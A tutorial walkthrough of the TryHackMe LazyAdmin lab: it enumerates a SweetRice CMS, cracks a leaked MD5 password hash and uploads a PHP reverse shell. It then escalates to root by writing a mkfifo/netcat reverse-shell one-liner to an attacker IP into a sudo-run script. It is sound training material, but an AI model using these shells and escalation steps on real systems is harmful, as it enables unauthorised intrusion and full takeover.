# LazyAdmin
This is a tutorial for the TryHackMe LazyAdmin challenge. A link to this challenge is here: https://tryhackme.com/r/room/lazyadmin
## Tools
Below are the primary tools I used for completing this challenge:
* Nmap
* Gobuster
* [Crackstation](https://crackstation.net/)
* [PentestMonkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell)
## Step 1: Recon, Scanning, and Enumeration
We'll start by conducting recon of our target, scanning for open ports and services, then enumerating directories.

1. Navigate to the target IP address, and you'll see that it's a default Apache page. Not much interesting there.
   
![image](https://github.com/fatmagician/LazyAdmin/assets/51951855/6e008ee7-37c0-41b7-a77f-abec67091c38)


2. Use nmap to scan the target:
`nmap -sC -sV 10.10.211.117`
    * We see that ports 22 (ssh) and 80 (http) are open, but don't find anything all that interesting.

![image](https://github.com/fatmagician/LazyAdmin/assets/51951855/a08ee95c-da9c-42c6-ad57-d372d46f7b92)

3. Next, we'll use gobuster to enumerate directories with the following command: `gobuster dir -u 10.10.211.117 -w /usr/share/wordlists/dirb/common.txt`
    * `dir` is gobuster's mode for detecting directories
    * `-u` is followed by the url to enumerate
    * `-w` allows us to specify a wordlist to use. In this case, **common.txt** is the wordlist we'll use
    - Our gobuster results tell us that we found a directory called **/content**, which might be of interest
  
4. Navigate to \<target IP\>/content to see what's there.
    * It tells us the site is under construction. But it also tells us the site was built using the **SweetRice** management system.
![image](https://github.com/fatmagician/LazyAdmin/assets/51951855/75e62ce9-2f80-4aa2-8fb8-d9c8bd3c9ee2)

5. Conduct some research on Google to see if there are any known exploits for SweetRice. We don't know which version of SweetRice is being used yet, but this might come in handy later on.
    * It turns out ExploitDB has a couple of exploits listed for SweetRice 1.5.1, including #40176 - Arbitrary File Upload (https://www.exploit-db.com/exploits/40716)
    * We can't do much with this information yet, but it's good to be aware of for later.
  
6. Let's try to further enumerate directories using **\<target IP\>/content** as our url: `gobuster dir -u 10.10.211.117/content -w /usr/share/wordlists/dirb/common.txt`
    * Now we've found some additional directories that we can explore.
      
![image](https://github.com/fatmagician/LazyAdmin/assets/51951855/9b742d67-b0ad-49bf-b5d3-2f2da1ca8ea9)

7. Explore the directories to see if we can find anything interesting.

8. **/content/inc** looks interesting. It lists a bunch of different files and folders that we can explore further. The files **lastest.txt** and the folder **mysql_backup/** look particularly intriguing.
   
![image](https://github.com/fatmagician/LazyAdmin/assets/51951855/4c4837d4-fe55-4f61-9dfa-c838a04b6d4c)

10. Open lastest.txt, and you'll see that it contains the text "1.5.1", which appears to confirm that SweetRice 1.5.1 is, in fact, the version this site uses.

11. Next, click on the folder mysql_backup/

12. This folder contains a file mysql_bakup_20191129023059-1.5.1.sql. Download this file and open it in a text editor to see what information it contains.

13. Towards the bottom of the file, you'll notice there are some SQL commands that contain a username and password:

![image](https://github.com/fatmagician/LazyAdmin/assets/51951855/a817f1bb-6952-4a27-bed8-759123224766)

This isn't the actual password, but appears to be a hashed value of a password. So we'll need to crack it in order to find the actual password.

14. We'll use [crackstation.net](https://crackstation.net/) to crack it.

    * Navigate to the Crackstation website.
    * Paste the hash value into the box.
    * Then confirm you're not a robot and click "Crack Hashes." (If you are a robot, sorry, I can't help you.)
   
![image](https://github.com/fatmagician/LazyAdmin/assets/51951855/4d27c315-f975-4d19-9f69-3dcc0238f479)

Crackstation shows that it's an MD5 hash and cracks it successfully.

15. Now we have a username ("manager"), and a password that we cracked using crackstation.
    
16. Looking through the other directories we enumerated earlier, **/content/as** is a login page. Enter the credentials there.

![image](https://github.com/fatmagician/LazyAdmin/assets/51951855/df89be5e-d8a6-4908-9d20-476e61d132c4)

17. And we're in!

![image](https://github.com/fatmagician/LazyAdmin/assets/51951855/b24300c4-d8d3-4130-94c4-15488e5323ab)

18. Conduct some additional recon now that we've logged into the site. Click around and try to find anything interesting.
    * One thing of interest is the **Ads** page, which will let us insert code. We might be able to use this to upload a reverse shell.
   
## Step 2: Exploitation
1. Now we'll create a reverse shell using the pentestmonkey php reverse shell located here: https://github.com/pentestmonkey/php-reverse-shell

2. Replace the IP in the reverse shell code with your attacking machine's IP, and replace the port with the port that you want to set up your netcat listener on:

![image](https://github.com/fatmagician/LazyAdmin/assets/51951855/812aa2fd-9983-49a9-b878-3a335b044ffe)

3. Copy and paste the reverse shell code into the "Ads code" box. Give it whatever name you want, then click "Done."
   
4. Now, when you navigate to the **\<target IP\>/content/inc** page, you'll notice there's an **ads/** folder there.
   
![image](https://github.com/fatmagician/LazyAdmin/assets/51951855/46a9c8b6-999c-491a-9d48-f55e5d2e142e)

5. Open the **ads/** folder, and your shell will be in there.

6. In order to catch this shell, we'll first need to start a netcat listener on our attacking machine.
    * Open another command line terminal and start a listener using the following command: `nc -lvnp 1234`
    * In our case, 1234 is the port we entered into our reverse shell code, so it's the same port we'll use for our listener.
  
7. Once the listener is started, click on the .php shell file you created.

8. Look at your listener and you'll see that it has established a connection!
    * If you're not getting a connection, make sure you entered the correct IP for your attacking machine into the reverse shell code you uploaded, as well as the same port that you're using for your listener.
  
![image](https://github.com/fatmagician/LazyAdmin/assets/51951855/b07c31db-5d09-4c27-9a61-0576af5ca822)

9. We now have user-level access to the system as the user **www-data**. Confirm this by typing the `whoami` command.

![image](https://github.com/fatmagician/LazyAdmin/assets/51951855/1bdf50c3-2d41-48ff-a229-ce6414de0bd9)

### Step 2.1: Find the user flag
1. Try to locate the flag using the `locate`command: `locate user.txt 2>/dev/null`
    * This will search the file system for "user.txt"
    * The "2>/dev/null" will ensure no errors get returned in the results, and will make the results much easier to search through

2. We found the flag in the folder **/home/itguy**.

![image](https://github.com/fatmagician/LazyAdmin/assets/51951855/216da661-44d2-4e92-8b6c-4ea373ee684d)

3. Use the `cat` command to read the contents of the file.

![image](https://github.com/fatmagician/LazyAdmin/assets/51951855/ceec2ba2-3548-4ddb-ae4c-d5ae7c203470)

4. Congratulations! You found the user flag! Now it's time to escalate our privileges to root to find the root flag.

## Step 3: Escalate Privileges
1. I tried searching for the root flag using the `locate`command, but no luck.
2. Our next step is to see which commands we have permission to run as sudo. For this, we'll use the command: `sudo -l`
    * The `sudo -l` command shows us all commands that our current user has permission to run as sudo
        
![image](https://github.com/fatmagician/LazyAdmin/assets/51951855/87285be0-397f-4773-a957-2094060f1412)
 
3. The highlighted portion of the results above are the main thing of interest to us. This tells us we can run the file **backup.pl** as sudo. This is likely a good place to insert our reverse shell to get root-level access.

4. We don't have permissions to directly edit **backup.pl**, but we can read its contents using `cat`.  

![image](https://github.com/fatmagician/LazyAdmin/assets/51951855/7c32f06c-bcce-4f8f-9544-9076ef258a5f)

5. It looks like all this file is doing is executing a different file called **copy.sh** located in the **/etc/** folder.

6. Read the contents of **copy.sh** to see what this file does.

![image](https://github.com/fatmagician/LazyAdmin/assets/51951855/a6cf53d3-59dd-4e50-a92a-490126d2b690)

It looks like copy.sh is, itself, a reverse shell.

7. Now we'll need to edit copy.sh so that it connects to our attacking machine's IP and a port of our choice.
    * We're not able to use `nano` or `vim` to edit the file, but we can use `echo` to write to it.
  
8. Using the `echo` command, replace the contents of copy.sh with a shell of our choice. We'll use the exact text that is already in there, but will replace the IP with our attacking machine's IP, and replace the port with a port of our choice:

    * `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.171.217 8888 >/tmp/f" > copy.sh`
    * This will overwrite the contents of copy.sh with our shell.
  
9. Now, it's time to set up a netcat listener to get ready to catch this shell. Open a new terminal and set up a netcat listener on the port you chose (in our case, it's port 8888):

    * `nc -lvnp 8888`

10. Once our listener is set up, it's time to execute backup.pl, which will also execute copy.sh. We can do this using the following command, which we saw earlier when we ran `sudo -l`:

    * `sudo /usr/bin/perl /home/itguy/backup.pl`

11. Now we have root!

![image](https://github.com/fatmagician/LazyAdmin/assets/51951855/ef6c9df5-c5c0-4762-82c3-33e5f026086e)

12. The final step is getting the root flag. We'll search for it using `locate`: `locate root.txt 2>/dev/null`

![image](https://github.com/fatmagician/LazyAdmin/assets/51951855/325e6d90-c2c8-4137-97c7-9d99ea954afa)

13. Then we'll read it using `cat`: `cat /root/root.txt`:

![image](https://github.com/fatmagician/LazyAdmin/assets/51951855/cdab857a-5ede-4230-83b7-47a1b95483f6)

## Conclusion/Next Steps
Congratulations! You've completed the LazyAdmin challenge on TryHackMe!

An optional next step is do your own writeup of this challenge. This will help with your writing and reporting skills, and will also help you learn the material more deeply. 

Nice work, and thanks for reading!


